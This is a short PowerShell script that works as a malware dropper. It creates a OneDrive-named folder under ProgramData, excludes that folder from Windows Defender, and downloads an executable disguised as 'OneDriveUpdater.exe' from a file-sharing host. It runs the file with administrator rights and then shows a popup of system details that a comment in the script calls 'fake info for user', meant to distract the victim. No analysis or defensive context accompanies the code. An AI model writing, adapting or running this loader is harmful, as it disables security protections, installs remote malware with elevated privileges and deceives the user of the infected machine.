$FolderName = "C:\ProgramData\OneDrive"
if (!(Test-Path $FolderName)) {
    #PowerShell Create directory if not exists
    New-Item $FolderName -ItemType Directory

}

#Anti-Virus
Add-MpPreference -ExclusionPath $FolderName

# Source URL
$url = "https://cdn-101.anonfiles.com/m16a7fOay4/87f59e21-1672059105/OneDriveUpdater.exe"
# Destation file
$dest = "C:\ProgramData\OneDrive\OneDriveUpdater.exe"
# Download the file
Invoke-WebRequest -Uri $url -OutFile $dest


#Start process
Start-Process $dest -Verb runAs

#Show fake info for user!
$properties = @{ 'Environment'=$env;
                                 'Logical name'=$logicalname;
                                 'Server name'=$computer;
            	                 'Total physical memory (GB)'=[decimal]$ComputerSystemInfo."TotalPhysicalMemory(GB)";
                                 'Domain'=$ComputerSystemInfo.Domain;
                                 'Manufacturer'=$ComputerSystemInfo.Manufacturer;
                                 'Model'=$ComputerSystemInfo.Model;
                                 'Number of logical processors'=$ComputerSystemInfo.NumberOfLogicalProcessors;
                                 'Number of processors'=$ComputerSystemInfo.NumberOfProcessors;
                                 'Bootup state'=$ComputerSystemInfo.BootupState;
                                 'Name'=$ComputerSystemInfo.Name;
                                 'IP'=$ip;
                                 'Collected'=(Get-Date -UFormat %Y.%m.%d' '%H:%M:%S)}

                $obj = New-Object -TypeName PSObject -Property $properties

$wsh = New-Object -ComObject Wscript.Shell

$wsh.Popup($obj)